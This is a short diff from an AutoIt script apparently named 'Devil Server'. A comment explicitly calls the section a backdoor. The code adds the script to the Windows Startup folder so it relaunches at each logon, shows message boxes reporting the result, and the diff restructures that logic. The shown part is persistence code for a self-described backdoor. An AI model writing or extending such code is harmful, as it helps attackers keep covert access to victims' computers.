@@ -33,16 +33,16 @@ HotKeySet("{PAUSE}", "RunControlPanel")
 ; ------------------------------------------------------------------------------
 
 ; Add backdoor to start-up
+
 If $Config_AddToStartup = "True" Then
 	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
 		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
-	EndIf
-
-	If FileExists(@StartupDir & "\devil_server.lnk") Then
-		IniWrite("config.ini", "Config", "AddToStartup", "False")
-		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
-	Else
-		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
+		Sleep($Config_Speed * 10)
+		If FileExists(@StartupDir & "\devil_server.lnk") Then
+			MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
+		Else
+			MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
+		EndIf
 	EndIf
 EndIf
 ; ------------------------------------------------------------------------------
